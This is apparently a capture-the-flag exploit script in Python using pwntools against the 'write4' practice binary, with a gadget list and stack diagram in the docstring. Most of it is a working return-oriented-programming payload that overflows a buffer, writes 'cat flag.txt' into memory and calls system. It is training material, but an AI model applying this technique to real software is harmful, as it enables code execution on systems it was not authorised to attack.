"""

g1: 0x400890: pop r14; pop r15; ret
g2: 0x400893: pop rdi; ret
g3: 0x400820: mov [r14],r15; ret


 +-----+
 | g1  |
 +-----+
 | r14 |
 +-----+
 | r15 |
 +-----+
 | g3  |  
 +-----+
 | pwn |
 +-----+

We should not jump to pwn. we should construct full chain instead,
but I am too fuckin lazy at the moment - 23:43
"""

from pwn import *



def genpayload(what, where):
    padding = 'A'*40
    payload = padding
    payload += p64(0x400890) #g2
    payload += p64(where)
    payload += what
    payload += p64(0x400820) #g3
    payload += p64(0x4007b5) #pwnme
    return payload


p = process('./write4')
p.clean()

p.sendline(genpayload('cat flag', 0x601080))
p.sendline(genpayload('.txt\x00\x00\x00\x00', 0x601088))

system_plt = p64(0x4005e0)
payload = 'A'*40
payload += p64(0x400893)  # pop rdi; ret
payload += p64(0x601080)  # 'cat flag.txt'
payload += system_plt	  # jmp system_got
payload += p64(0)	  # ret from system@plt


p.sendline(payload)
log.info('flag: ' + p.recv())
p.close()
